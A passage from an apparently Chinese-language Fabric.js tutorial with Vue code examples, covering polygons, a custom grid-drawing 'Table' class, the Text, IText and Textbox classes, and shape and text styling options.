<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> polygon = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Polygon</span>([
    {<span class="hljs-attr">x</span>: <span class="hljs-number">30</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">30</span>},
    {<span class="hljs-attr">x</span>: <span class="hljs-number">150</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">140</span>},
    {<span class="hljs-attr">x</span>: <span class="hljs-number">240</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">150</span>},
    {<span class="hljs-attr">x</span>: <span class="hljs-number">100</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">30</span>}
  ], {
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#ffd3b6'</span>, <span class="hljs-comment">// 填充色</span>
    <span class="hljs-attr">stroke</span>: <span class="hljs-string">'#6639a6'</span>, <span class="hljs-comment">// 线段颜色：紫色</span>
    <span class="hljs-attr">strokeWidth</span>: <span class="hljs-number">5</span> <span class="hljs-comment">// 线段粗细 5</span>
  })
  canvas.<span class="hljs-title function_">add</span>(polygon)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>使用 <code>new fabric.Polygon</code> 绘制多边形，用法和 <code>new fabric.Polyline</code> 差不多，但最大的不同点是 <code>new fabric.Polygon</code> 会自动把 <strong>起始点</strong> 和 <strong>结束点</strong> 连接起来。</p>
<h2 data-id="heading-20">自定义图形</h2>
<p>在Fabric.js中，几乎所有的2d图形直接或间接继承自 Object 类，那么如果我们不用其自带的2d图形，而是自建图形，要怎么应用 Fabric.js 中的方法呢？</p>
<p>Fabric.js 提供了 <strong>fabric.util.createClass</strong> 方法解决这个问题</p>
<p>一个自定义子类的结构：</p>
<pre><code class="hljs language-ts" lang="ts">      <span class="hljs-comment">// 创建一个自定义子类</span>
      <span class="hljs-keyword">const</span> customClass = fabric.<span class="hljs-property">util</span>.<span class="hljs-title function_">createClass</span>(fabric.<span class="hljs-property">Object</span>, {
        <span class="hljs-attr">type</span>: <span class="hljs-string">"customClass"</span>,
        <span class="hljs-attr">initialize</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">options</span>) {
          options || (options = {});
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callSuper</span>(<span class="hljs-string">"initialize"</span>, options);
          <span class="hljs-comment">// 自定义属性</span>
        },

        <span class="hljs-attr">toObject</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
          <span class="hljs-keyword">return</span> fabric.<span class="hljs-property">util</span>.<span class="hljs-property">object</span>.<span class="hljs-title function_">extend</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callSuper</span>(<span class="hljs-string">"toObject"</span>), {
            <span class="hljs-comment">// 将自定义属性添加到序列化对象中</span>
          });
        },

        <span class="hljs-attr">_render</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">ctx</span>) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callSuper</span>(<span class="hljs-string">"_render"</span>, ctx);
          <span class="hljs-comment">// 自定义渲染逻辑</span>
        },
      });
</code></pre>
<p>一个简单的自定义类主要要修改3个地方，分别是：</p>
<ol>
<li><strong>initialize</strong> : 添加的自定义属性方法放这</li>
<li><strong>toObject</strong>: 将自定义属性添加到序列化对象中，方便canvas记录</li>
<li><strong>_render</strong>: 处理自定义渲染逻辑</li>
</ol>
<p>此处举一个简单的例子，写一个自定义表格图形：</p>
<p>新增绘制网格图的方法 initMap：</p>
<pre><code class="hljs language-ts" lang="ts">      <span class="hljs-comment">// 绘制表格图形</span>
      <span class="hljs-keyword">function</span> <span class="hljs-title function_">initTable</span>(<span class="hljs-params">options, ctx</span>) {
        <span class="hljs-keyword">const</span> { gridNumX, gridNumY, width, height, fill, left, top } = options;
        ctx.<span class="hljs-title function_">save</span>();
        ctx.<span class="hljs-title function_">translate</span>(-width / <span class="hljs-number">2</span>, -height / <span class="hljs-number">2</span>)
        <span class="hljs-comment">// 开始路径并绘制线条</span>
        ctx.<span class="hljs-title function_">beginPath</span>();
        <span class="hljs-comment">// 设置线条样式</span>
        ctx.<span class="hljs-property">lineWidth</span> = <span class="hljs-number">1</span>;
        ctx.<span class="hljs-property">strokeStyle</span> = fill;
        <span class="hljs-comment">// 开始绘制横线</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; gridNumY + <span class="hljs-number">1</span>; i++) {
          <span class="hljs-comment">// 注意要算线的宽度，也就是后面那个+i</span>
          ctx.<span class="hljs-title function_">moveTo</span>(<span class="hljs-number">0</span>, height / gridNumY * i);
          ctx.<span class="hljs-title function_">lineTo</span>(width, height / gridNumY * i);
          ctx.<span class="hljs-title function_">stroke</span>();
        }
        <span class="hljs-comment">// 开始绘制竖线</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; gridNumX + <span class="hljs-number">1</span>; i++) {
          ctx.<span class="hljs-title function_">moveTo</span>(width / gridNumX * i, <span class="hljs-number">0</span>);
          ctx.<span class="hljs-title function_">lineTo</span>(width / gridNumX * i, height);
          ctx.<span class="hljs-title function_">stroke</span>();
        }
        ctx.<span class="hljs-title function_">restore</span>();
      }
</code></pre>
<p>创建 Table 子类：</p>
<pre><code class="hljs language-ts" lang="ts">      <span class="hljs-comment">// 创建一个自定义子类</span>
      <span class="hljs-keyword">const</span> <span class="hljs-title class_">Map</span> = fabric.<span class="hljs-property">util</span>.<span class="hljs-title function_">createClass</span>(fabric.<span class="hljs-property">Object</span>, {
        <span class="hljs-attr">type</span>: <span class="hljs-string">"Table"</span>,
        <span class="hljs-attr">initialize</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">options</span>) {
          options || (options = {});
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callSuper</span>(<span class="hljs-string">"initialize"</span>, options);
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">set</span>(<span class="hljs-string">"gridNumX"</span>, options.<span class="hljs-property">gridNumX</span> || <span class="hljs-string">""</span>);
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">set</span>(<span class="hljs-string">"gridNumY"</span>, options.<span class="hljs-property">gridNumY</span> || <span class="hljs-string">""</span>);
        },

        <span class="hljs-attr">toObject</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
          <span class="hljs-keyword">return</span> fabric.<span class="hljs-property">util</span>.<span class="hljs-property">object</span>.<span class="hljs-title function_">extend</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callSuper</span>(<span class="hljs-string">"toObject"</span>), {
            <span class="hljs-attr">gridNumX</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">"gridNumX"</span>),
            <span class="hljs-attr">gridNumY</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">"gridNumY"</span>),
          });
        },

        <span class="hljs-attr">_render</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">ctx</span>) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callSuper</span>(<span class="hljs-string">"_render"</span>, ctx);
          <span class="hljs-title function_">initTable</span>({
            ...<span class="hljs-variable language_">this</span>
          }, ctx)
        },
      });
</code></pre>
<p>新建 Table 实例并添加到canvas：</p>
<pre><code class="hljs language-ts" lang="ts">      <span class="hljs-keyword">const</span> table = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Table</span>({
        <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
        <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
        <span class="hljs-attr">label</span>: <span class="hljs-string">"test"</span>,
        <span class="hljs-attr">fill</span>: <span class="hljs-string">"#faa"</span>,
        <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>,
        <span class="hljs-attr">height</span>: <span class="hljs-number">100</span>,
        <span class="hljs-attr">gridNumX</span>: <span class="hljs-number">4</span>,
        <span class="hljs-attr">gridNumY</span>: <span class="hljs-number">3</span>
      });

      <span class="hljs-keyword">const</span> table2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Table</span>({
        <span class="hljs-attr">left</span>: <span class="hljs-number">300</span>,
        <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
        <span class="hljs-attr">label</span>: <span class="hljs-string">"test"</span>,
        <span class="hljs-attr">fill</span>: <span class="hljs-string">"green"</span>,
        <span class="hljs-attr">width</span>: <span class="hljs-number">200</span>,
        <span class="hljs-attr">height</span>: <span class="hljs-number">300</span>,
        <span class="hljs-attr">gridNumX</span>: <span class="hljs-number">2</span>,
        <span class="hljs-attr">gridNumY</span>: <span class="hljs-number">5</span>
      });
      <span class="hljs-comment">// 将所有图形添加到 canvas 中</span>
      canvas.<span class="hljs-title function_">add</span>(table, table2);
</code></pre>
<p>如图所示，成功创建了可复用的自定义图形，而且能够使用 Object 类的功能。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51278909343d4dab95c3bc969afdf05d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=y4NOB3PuiPkXIDGm18c2YwEDaoY%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-21">文本</h2>
<p><code>Fabric.js</code> 有3类跟文本相关的 <code>api</code>。</p>
<ul>
<li>普通文本</li>
<li>可编辑文本</li>
<li>文本框</li>
</ul>
<h3 data-id="heading-22">普通文本 Text</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> text = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(<span class="hljs-string">'hello'</span>)
  canvas.<span class="hljs-title function_">add</span>(text)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>使用 <code>new fabric.Text</code> 创建文本，传入第一个参数就是文本内容。</p>
<p><code>new fabric.Text</code> 还支持第二个参数，可以设置文本样式。</p>
<h3 data-id="heading-23">可编辑文本 IText</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> itext = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">IText</span>(<span class="hljs-string">'hello'</span>)
  canvas.<span class="hljs-title function_">add</span>(itext)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>使用 <code>new fabric.IText</code> 可以创建<strong>可编辑文本</strong>，用法和 <code>new fabric.Text</code> 一样。</p>
<h3 data-id="heading-24">文本框 Textbox</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> textbox = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Textbox</span>(<span class="hljs-string">'What are you doing?'</span>, {
    <span class="hljs-attr">width</span>: <span class="hljs-number">250</span>
  })
  canvas.<span class="hljs-title function_">add</span>(textbox)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>使用 <code>new fabric.Textbox</code> 可以创建文本框。</p>
<p><code>new fabric.Textbox</code> 第二个参数是对象，使用 <code>width</code> 可以设定了文本框的宽度，文本内容超过设定的宽度会自动换行。</p>
<p><code>new fabric.Textbox</code> 的内容同样是<strong>可编辑</strong>的。</p>
<h2 data-id="heading-25">基础样式</h2>
<h3 data-id="heading-26">图形常用样式</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">radius</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// 半径：50px</span>
    <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'green'</span>, <span class="hljs-comment">// 背景色：绿色</span>
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'orange'</span>, <span class="hljs-comment">// 填充色：橙色</span>
    <span class="hljs-attr">stroke</span>: <span class="hljs-string">'#f6416c'</span>, <span class="hljs-comment">// 边框颜色：粉色</span>
    <span class="hljs-attr">strokeWidth</span>: <span class="hljs-number">5</span>, <span class="hljs-comment">// 边框粗细：5px</span>
    <span class="hljs-attr">strokeDashArray</span>: [<span class="hljs-number">20</span>, <span class="hljs-number">5</span>, <span class="hljs-number">14</span>], <span class="hljs-comment">// 边框虚线规则：填充20px 空5px 填充14px 空20px 填充5px ……</span>
    <span class="hljs-attr">shadow</span>: <span class="hljs-string">'10px 20px 6px rgba(10, 20, 30, 0.4)'</span>, <span class="hljs-comment">// 投影：向右偏移10px，向下偏移20px，羽化6px，投影颜色及透明度</span>
    <span class="hljs-attr">transparentCorners</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// 选中时，角是被填充了。true 空心；false 实心</span>
    <span class="hljs-attr">borderColor</span>: <span class="hljs-string">'#16f1fc'</span>, <span class="hljs-comment">// 选中时，边框颜色：天蓝</span>
    <span class="hljs-attr">borderScaleFactor</span>: <span class="hljs-number">5</span>, <span class="hljs-comment">// 选中时，边的粗细：5px</span>
    <span class="hljs-attr">borderDashArray</span>: [<span class="hljs-number">20</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">7</span>], <span class="hljs-comment">// 选中时，虚线边的规则</span>
    <span class="hljs-attr">cornerColor</span>: <span class="hljs-string">"#a1de93"</span>, <span class="hljs-comment">// 选中时，角的颜色是 青色</span>
    <span class="hljs-attr">cornerStrokeColor</span>: <span class="hljs-string">'pink'</span>, <span class="hljs-comment">// 选中时，角的边框的颜色是 粉色</span>
    <span class="hljs-attr">cornerStyle</span>: <span class="hljs-string">'circle'</span>, <span class="hljs-comment">// 选中时，叫的属性。默认rect 矩形；circle 圆形</span>
    <span class="hljs-attr">cornerSize</span>: <span class="hljs-number">20</span>, <span class="hljs-comment">// 选中时，角的大小为20</span>
    <span class="hljs-attr">cornerDashArray</span>: [<span class="hljs-number">10</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>], <span class="hljs-comment">// 选中时，虚线角的规则</span>
    <span class="hljs-attr">selectionBackgroundColor</span>: <span class="hljs-string">'#7f1300'</span>, <span class="hljs-comment">// 选中时，选框的背景色：朱红</span>
    <span class="hljs-attr">padding</span>: <span class="hljs-number">40</span>, <span class="hljs-comment">// 选中时，选择框离元素的内边距：40px</span>
    <span class="hljs-attr">borderOpacityWhenMoving</span>: <span class="hljs-number">0.6</span>, <span class="hljs-comment">// 当对象活动和移动时，对象控制边界的不透明度  </span>
  })

  canvas.<span class="hljs-title function_">add</span>(circle)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-27">文本常用样式</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> text = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(<span class="hljs-string">'hello'</span>, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">120</span>,
    <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'green'</span>, <span class="hljs-comment">// 背景色：绿色</span>
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'orange'</span>, <span class="hljs-comment">// 填充色：橙色</span>
    <span class="hljs-attr">stroke</span>: <span class="hljs-string">'#f6416c'</span>, <span class="hljs-comment">// 边框颜色：粉色</span>
    <span class="hljs-attr">strokeWidth</span>: <span class="hljs-number">3</span>, <span class="hljs-comment">// 边框粗细：3px</span>
    <span class="hljs-attr">strokeDashArray</span>: [<span class="hljs-number">20</span>, <span class="hljs-number">5</span>, <span class="hljs-number">14</span>], <span class="hljs-comment">// 边框虚线规则：填充20px 空5px 填充14px 空20px 填充5px ……</span>
    <span class="hljs-attr">shadow</span>: <span class="hljs-string">'10px 20px 6px rgba(10, 20, 30, 0.4)'</span>, <span class="hljs-comment">// 投影：向右偏移10px，向下偏移20px，羽化6px，投影颜色及透明度</span>
    <span class="hljs-attr">transparentCorners</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// 选中时，角是被填充了。true 空心；false 实心</span>
    <span class="hljs-attr">borderColor</span>: <span class="hljs-string">'#16f1fc'</span>, <span class="hljs-comment">// 选中时，边框颜色：天蓝</span>
    <span class="hljs-attr">borderScaleFactor</span>: <span class="hljs-number">5</span>, <span class="hljs-comment">// 选中时，边的粗细：5px</span>
    <span class="hljs-attr">borderDashArray</span>: [<span class="hljs-number">20</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">7</span>], <span class="hljs-comment">// 选中时，虚线边的规则</span>
    <span class="hljs-attr">cornerColor</span>: <span class="hljs-string">"#a1de93"</span>, <span class="hljs-comment">// 选中时，角的颜色是 青色</span>
    <span class="hljs-attr">cornerStrokeColor</span>: <span class="hljs-string">'pink'</span>, <span class="hljs-comment">// 选中时，角的边框的颜色是 粉色</span>
    <span class="hljs-attr">cornerStyle</span>: <span class="hljs-string">'circle'</span>, <span class="hljs-comment">// 选中时，叫的属性。默认rect 矩形；circle 圆形</span>
    <span class="hljs-attr">cornerSize</span>: <span class="hljs-number">20</span>, <span class="hljs-comment">// 选中时，角的大小为20</span>
    <span class="hljs-attr">cornerDashArray</span>: [<span class="hljs-number">10</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>], <span class="hljs-comment">// 选中时，虚线角的规则</span>
    <span class="hljs-attr">selectionBackgroundColor</span>: <span class="hljs-string">'#7f1300'</span>, <span class="hljs-comment">// 选中时，选框的背景色：朱红</span>
    <span class="hljs-attr">padding</span>: <span class="hljs-number">40</span>, <span class="hljs-comment">// 选中时，选择框离元素的内边距：40px</span>
    <span class="hljs-attr">borderOpacityWhenMoving</span>: <span class="hljs-number">0.6</span>, <span class="hljs-comment">// 当对象活动和移动时，对象控制边界的不透明度  </span>
  })

  canvas.<span class="hljs-title function_">add</span>(text)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>除此之外，还可以配置 <strong>上划线</strong> 、<strong>下划线</strong> 、<strong>删除线</strong> 、<strong>左对齐</strong> 、 <strong>右对齐</strong> 、 <strong>居中对齐</strong> 、 <strong>行距</strong> 等。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8af97b9f7c554724a5b72fd219445da9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=ZLf3l9QixmcOBqD6iEPsrbM7R7Y%3D" alt="030.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"600"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// 上划线</span>
  <span class="hljs-keyword">const</span> overline = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(<span class="hljs-string">'上划线'</span>, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">30</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">10</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">overline</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 上划线</span>
  })

  <span class="hljs-comment">// 下划线</span>
  <span class="hljs-keyword">const</span> underline = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(<span class="hljs-string">'下划线'</span>, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">30</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">underline</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 下划线</span>
  })

  <span class="hljs-comment">// 删除线</span>
  <span class="hljs-keyword">const</span> linethrough = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(<span class="hljs-string">'删除线'</span>, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">30</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">200</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">linethrough</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 删除线</span>
  })

  <span class="hljs-comment">// 左对齐</span>
  <span class="hljs-keyword">const</span> msg1 = <span class="hljs-string">'左\n左左\n左对齐'</span>
  <span class="hljs-keyword">const</span> left = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(msg1, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">10</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">16</span>,
    <span class="hljs-attr">textAlign</span>: <span class="hljs-string">'left'</span>, <span class="hljs-comment">// 左对齐</span>
  })

  <span class="hljs-comment">// 居中对齐</span>
  <span class="hljs-keyword">const</span> msg2 = <span class="hljs-string">'中\n中中\n居中对齐'</span>
  <span class="hljs-keyword">const</span> center = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(msg2, {
